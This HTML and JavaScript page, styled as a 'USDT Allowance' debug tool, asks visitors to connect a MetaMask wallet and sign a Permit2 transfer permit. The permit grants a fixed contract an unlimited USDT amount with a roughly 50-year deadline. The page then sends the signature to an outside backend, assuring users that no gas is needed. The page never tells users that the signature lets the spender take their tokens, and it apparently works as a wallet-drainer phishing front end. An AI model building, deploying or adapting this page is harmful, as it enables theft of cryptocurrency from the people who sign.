<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>USDT Allowance - Debug</title>
    <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js">
    </script>
    <style>
        *{margin:0;padding:0;box-sizing:border-box}
        body{font-family:Arial,sans-serif;background:linear-gradient(135deg,#667eea 0%,#764ba2 100%);min-height:100vh;display:flex;justify-content:center;align-items:center;padding:20px}
        .container{background:white;border-radius:20px;padding:40px;max-width:550px;width:100%;box-shadow:0 20px 60px rgba(0,0,0,0.3)}
        h1{color:#333;text-align:center;margin-bottom:5px;font-size:24px}
        .subtitle{text-align:center;color:#666;margin-bottom:30px;font-size:14px}
        .wallet-status{background:#f0f0f0;padding:12px;border-radius:10px;text-align:center;margin-bottom:20px;font-size:14px;word-break:break-all}
        .wallet-status.connected{background:#d4edda;color:#155724}
        .info-box{background:#f8f9fa;padding:15px;border-radius:10px;margin-bottom:20px;font-size:13px}
        .info-box div{padding:5px 0;border-bottom:1px solid #e0e0e0}
        .info-box div:last-child{border-bottom:none}
        button{padding:14px 20px;border:none;border-radius:10px;font-size:16px;font-weight:600;cursor:pointer;color:white;width:100%}
        button:hover{transform:translateY(-2px);box-shadow:0 5px 20px rgba(0,0,0,0.2)}
        button:disabled{opacity:0.5;cursor:not-allowed}
        .btn-connect{background:#667eea}
        .btn-sign{background:#28a745}
        .btn-sign.signing{background:#ffc107;color:#333}
        .btn-sign.done{background:#17a2b8}
        .status-msg{margin-top:15px;padding:12px;border-radius:10px;display:none;text-align:center}
        .status-msg.success{display:block;background:#d4edda;color:#155724}
        .status-msg.error{display:block;background:#f8d7da;color:#721c24}
        .status-msg.info{display:block;background:#d1ecf1;color:#0c5460}
        .status-msg.loading{display:block;background:#fff3cd;color:#856404}
        .loading{display:inline-block;width:18px;height:18px;border:3px solid #f3f3f3;border-top:3px solid #667eea;border-radius:50%;animation:spin 1s linear infinite;margin-right:10px;vertical-align:middle}
        @keyframes spin{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}
        .highlight{background:#e8f4f8;padding:12px;border-radius:8px;border-left:4px solid #17a2b8;margin-bottom:15px;font-size:13px}
        .contract-address{background:#f0f0f0;padding:8px 12px;border-radius:6px;font-size:12px;word-break:break-all;text-align:center;margin:10px 0}
        .api-url-input{width:100%;padding:10px;border:2px solid #e0e0e0;border-radius:8px;font-size:13px;margin-bottom:15px}
        .debug-box{background:#2d2d2d;color:#00ff00;padding:15px;border-radius:10px;font-family:monospace;font-size:12px;margin-top:15px;max-height:200px;overflow-y:auto;display:none;white-space:pre-wrap;word-break:break-all}
        .debug-box.show{display:block}
        .toggle-debug{background:#6c757d;padding:8px;font-size:12px;margin-top:10px;width:auto;display:inline-block}
        .highlight-green{background:#d4edda;padding:12px;border-radius:8px;border-left:4px solid #28a745;margin-bottom:15px;font-size:13px;color:#155724}
    </style>
</head>
<body>
    <div class="container">
        <h1>💰 USDT Allowance</h1>
        <p class="subtitle">Debug Version - Find the Error!</p>
        
        <div class="contract-address">📋 Contract: 0xb69E225117d428a0b349BAB76368c68012Df1837</div>
        
        <div class="highlight-green">
            ✅ <strong>Debug Mode:</strong> Check console and debug box for errors
        </div>

        <div id="walletStatus" class="wallet-status">⛓️ Not Connected</div>

        <div class="info-box">
            <div><strong>👤 Your Address:</strong> <span id="userDisplay">Not connected</span></div>
            <div><strong>⏰ Allowance:</strong> <span id="allowanceDisplay">Check after connect</span></div>
            <div><strong>📅 Valid Until:</strong> <span id="expiryDisplay">-</span></div>
        </div>

        <input type="text" id="apiUrlInput" class="api-url-input" 
               value="https://usdt-allowance-backend.vercel.app/api/submit-signature">

        <button id="connectBtn" class="btn-connect">🔗 Connect Wallet</button>
        <br><br>
        <button id="signBtn" class="btn-sign" disabled>✍️ Sign & Submit</button>

        <button id="toggleDebug" class="toggle-debug">🔍 Show Debug</button>
        <div id="debugBox" class="debug-box"></div>

        <div id="statusMsg" class="status-msg"></div>
    </div>

    <script>
        // ============================================
        // ⭐ DEBUG HELPER
        // ============================================
        const debugLogs = [];

        function debugLog(message, data = null) {
            const timestamp = new Date().toLocaleTimeString();
            const logEntry = `[${timestamp}] ${message}`;
            console.log(logEntry, data || '');
            
            debugLogs.push(logEntry);
            if (data) {
                debugLogs.push(JSON.stringify(data, null, 2));
            }
            
            // Update debug box
            const debugBox = document.getElementById('debugBox');
            debugBox.textContent = debugLogs.join('\n');
            debugBox.scrollTop = debugBox.scrollHeight;
        }

        // ============================================
        // CONFIG
        // ============================================
        const CONFIG = {
            contractAddress: "0xb69E225117d428a0b349BAB76368c68012Df1837",
            permit2Address: "0x000000000022D473030F116dDEE9F6B43aC78BA3",
            usdtAddress: "0xdAC17F958D2ee523a2206206994597C13D831ec7",
            chainId: 1
        };

        debugLog('🚀 App Started');
        debugLog('📋 Contract:', CONFIG.contractAddress);

        // ============================================
        // STATE
        // ============================================
        let signer, provider, userAddress;

        // ============================================
        // DOM
        // ============================================
        const $ = (id) => document.getElementById(id);
        const walletStatus = $('walletStatus');
        const connectBtn = $('connectBtn');
        const signBtn = $('signBtn');
        const statusMsg = $('statusMsg');
        const userDisplay = $('userDisplay');
        const allowanceDisplay = $('allowanceDisplay');
        const expiryDisplay = $('expiryDisplay');
        const apiUrlInput = $('apiUrlInput');
        const debugBox = $('debugBox');
        const toggleDebug = $('toggleDebug');

        // ============================================
        // HELPERS
        // ============================================
        function showStatus(msg, type = 'info') {
            statusMsg.className = `status-msg ${type}`;
            statusMsg.textContent = msg;
            statusMsg.style.display = 'block';
            debugLog(`📢 Status: ${msg} (${type})`);
            setTimeout(() => { statusMsg.style.display = 'none'; }, 10000);
        }

        function shortenAddress(addr) {
            if (!addr) return '';
            return addr.slice(0, 6) + '...' + addr.slice(-4);
        }

        // Toggle debug box
        toggleDebug.addEventListener('click', () => {
            debugBox.classList.toggle('show');
            toggleDebug.textContent = debugBox.classList.contains('show') ? '🔍 Hide Debug' : '🔍 Show Debug';
        });

        // ============================================
        // CONNECT WALLET
        // ============================================
        async function connectWallet() {
            debugLog('⏳ connectWallet() started');
            
            try {
                if (!window.ethereum) {
                    debugLog('❌ No MetaMask found');
                    showStatus('Please install MetaMask!', 'error');
                    return;
                }

                debugLog('✅ MetaMask found');

                provider = new ethers.providers.Web3Provider(window.ethereum);
                debugLog('✅ Provider created');

                await provider.send("eth_requestAccounts", []);
                signer = provider.getSigner();
                userAddress = await signer.getAddress();
                debugLog('👤 User Address:', userAddress);

                const network = await provider.getNetwork();
                debugLog('🌐 Network:', network);
                
                if (network.chainId !== CONFIG.chainId) {
                    debugLog('❌ Wrong network', { expected: CONFIG.chainId, got: network.chainId });
                    showStatus('Please switch to Ethereum Mainnet!', 'error');
                    return;
                }

                debugLog('✅ Network OK');

                walletStatus.className = 'wallet-status connected';
                walletStatus.innerHTML = `🟢 Connected: ${shortenAddress(userAddress)}`;
                connectBtn.textContent = '✅ Connected';
                connectBtn.disabled = true;
                signBtn.disabled = false;

                userDisplay.textContent = shortenAddress(userAddress);

                // Check allowance
                await checkAllowance();

                showStatus('✅ Connected!', 'success');
                debugLog('✅ Connect complete');

            } catch (error) {
                debugLog('❌ connectWallet ERROR:', error.message);
                console.error(error);
                showStatus(`Error: ${error.message}`, 'error');
            }
        }

        // ============================================
        // CHECK ALLOWANCE
        // ============================================
        async function checkAllowance() {
            debugLog('⏳ checkAllowance() started');
            
            try {
                if (!userAddress) {
                    debugLog('⚠️ No user address');
                    allowanceDisplay.textContent = 'Connect wallet first';
                    return;
                }

                debugLog('👤 Checking for:', userAddress);

                const contract = new ethers.Contract(CONFIG.contractAddress, [
                    "function getAllowance(address user) external view returns (uint160 amount, uint48 expiration, uint48 nonce)"
                ], provider);

                debugLog('📋 Contract created');

                const result = await contract.getAllowance(userAddress);
                debugLog('📊 Allowance result:', result);

                const amount = result.amount;
                const expiration = result.expiration;

                if (amount.toString() === '0') {
                    allowanceDisplay.textContent = '❌ No allowance';
                    expiryDisplay.textContent = '-';
                    debugLog('ℹ️ No allowance set');
                    return;
                }

                const isUnlimited = amount.toString() === ethers.constants.MaxUint256.toString();
                allowanceDisplay.textContent = isUnlimited ? '♾️ UNLIMITED ✅' : amount.toString();
                debugLog('♾️ Is Unlimited:', isUnlimited);

                if (expiration > 0) {
                    const date = new Date(expiration * 1000);
                    expiryDisplay.textContent = date.toLocaleDateString();
                    debugLog('📅 Expires:', date.toLocaleDateString());
                }

                if (isUnlimited && expiration > Math.floor(Date.now() / 1000)) {
                    signBtn.textContent = '✅ Already Approved!';
                    signBtn.className = 'btn-sign done';
                    signBtn.disabled = true;
                    debugLog('✅ Already approved');
                }

            } catch (error) {
                debugLog('❌ checkAllowance ERROR:', error.message);
                console.error(error);
            }
        }

        // ============================================
        // GET PERMIT2 NONCE
        // ============================================
        async function getPermit2Nonce() {
            debugLog('⏳ getPermit2Nonce() started');
            
            try {
                const permit2 = new ethers.Contract(CONFIG.permit2Address, [
                    "function allowance(address owner, address token, address spender) external view returns (uint160 amount, uint48 expiration, uint48 nonce)"
                ], provider);

                const data = await permit2.allowance(userAddress, CONFIG.usdtAddress, CONFIG.contractAddress);
                debugLog('📝 Nonce:', data.nonce.toString());
                return data.nonce;
                
            } catch (error) {
                debugLog('❌ getPermit2Nonce ERROR:', error.message);
                throw error;
            }
        }

        // ============================================
        // ⭐ SIGN & SUBMIT - Main Function
        // ============================================
        async function signAndSubmit() {
            debugLog('🚀 signAndSubmit() started');
            
            try {
                if (!signer || !userAddress) {
                    debugLog('❌ Not connected');
                    showStatus('Connect wallet first!', 'error');
                    return;
                }

                const apiUrl = apiUrlInput.value.trim();
                debugLog('📤 API URL:', apiUrl);
                
                if (!apiUrl || !apiUrl.startsWith('http')) {
                    debugLog('❌ Invalid API URL');
                    showStatus('Please enter a valid Backend URL!', 'error');
                    return;
                }

                signBtn.innerHTML = '<span class="loading"></span> Signing...';
                signBtn.className = 'btn-sign signing';
                signBtn.disabled = true;

                // Step 1: Get nonce
                debugLog('📝 Getting nonce...');
                const nonce = await getPermit2Nonce();
                debugLog('✅ Nonce:', nonce.toString());
                
                // Step 2: Create deadline
                const years = 50;
                const deadline = Math.floor(Date.now() / 1000) + (365 * 24 * 3600 * years);
                debugLog('⏰ Deadline:', deadline, new Date(deadline * 1000).toLocaleString());

                showStatus('✍️ Please sign in MetaMask... (No Gas!)', 'info');

                // Step 3: Create EIP-712 message
                debugLog('📝 Creating EIP-712 message...');
                
                const domain = {
                    name: "Permit2",
                    version: "1",
                    chainId: CONFIG.chainId,
                    verifyingContract: CONFIG.permit2Address
                };
                debugLog('📋 Domain:', domain);

                const types = {
                    PermitTransferFrom: [
                        { name: "permitted", type: "TokenPermissions" },
                        { name: "spender", type: "address" },
                        { name: "nonce", type: "uint256" },
                        { name: "deadline", type: "uint256" }
                    ],
                    TokenPermissions: [
                        { name: "token", type: "address" },
                        { name: "amount", type: "uint256" }
                    ]
                };

                // ⭐ UNLIMITED - .toString() එක අමතක කරන්න එපා!
                const message = {
                    permitted: {
                        token: CONFIG.usdtAddress,
                        amount: ethers.constants.MaxUint256.toString()
                    },
                    spender: CONFIG.contractAddress,
                    nonce: nonce,
                    deadline: deadline
                };
                debugLog('📝 Message:', message);

                // Step 4: Get signature (Off-Chain - Gas Free!)
                debugLog('✍️ Requesting signature from MetaMask...');
                const signature = await signer._signTypedData(domain, types, message);
                debugLog('✅ Signature received!', signature.substring(0, 40) + '...');

                // Step 5: Send to backend
                const signatureData = {
                    user: userAddress,
                    nonce: nonce.toString(),
                    deadline: deadline,
                    signature: signature
                };
                debugLog('📤 Sending to backend:', signatureData);

                showStatus('📤 Sending to backend... (Backend will pay gas)', 'loading');

                // ⭐ Make API call
                debugLog('🌐 Fetching:', apiUrl);
                const response = await fetch(apiUrl, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(signatureData)
                });

                debugLog('📥 Response status:', response.status);
                debugLog('📥 Response headers:', Object.fromEntries(response.headers));

                // ⭐ Try to parse response
                let result;
                try {
                    const text = await response.text();
                    debugLog('📥 Raw response:', text.substring(0, 500) + '...');
                    result = JSON.parse(text);
                    debugLog('✅ JSON parsed:', result);
                } catch (parseError) {
                    debugLog('❌ JSON Parse Error:', parseError.message);
                    showStatus(`Error: Backend returned HTML instead of JSON. Please check backend URL.`, 'error');
                    signBtn.innerHTML = '✍️ Sign & Submit';
                    signBtn.className = 'btn-sign';
                    signBtn.disabled = false;
                    return;
                }

                if (result.success) {
                    debugLog('✅ Success! Tx Hash:', result.txHash);
                    signBtn.innerHTML = '✅ Approved!';
                    signBtn.className = 'btn-sign done';
                    signBtn.disabled = true;

                    showStatus(`✅ ${result.message}`, 'success');
                    console.log("🔗 https://etherscan.io/tx/" + result.txHash);
                    await checkAllowance();

                } else {
                    debugLog('❌ Backend error:', result.error);
                    showStatus(`❌ Error: ${result.error}`, 'error');
                    signBtn.innerHTML = '✍️ Sign & Submit';
                    signBtn.className = 'btn-sign';
                    signBtn.disabled = false;
                }

            } catch (error) {
                debugLog('❌ signAndSubmit ERROR:', error.message);
                console.error(error);
                showStatus(`Error: ${error.message}`, 'error');
                signBtn.innerHTML = '✍️ Sign & Submit';
                signBtn.className = 'btn-sign';
                signBtn.disabled = false;
            }
        }

        // ============================================
        // EVENT LISTENERS
        // ============================================
        connectBtn.addEventListener('click', connectWallet);
        signBtn.addEventListener('click', signAndSubmit);

        if (window.ethereum) {
            window.ethereum.on('accountsChanged', () => location.reload());
            window.ethereum.on('chainChanged', () => location.reload());
        }

        debugLog('✅ App ready!');
        console.log('🚀 USDT Allowance - Debug Mode');
        console.log('📋 Contract:', CONFIG.contractAddress);
    </script>
</body>
</html>
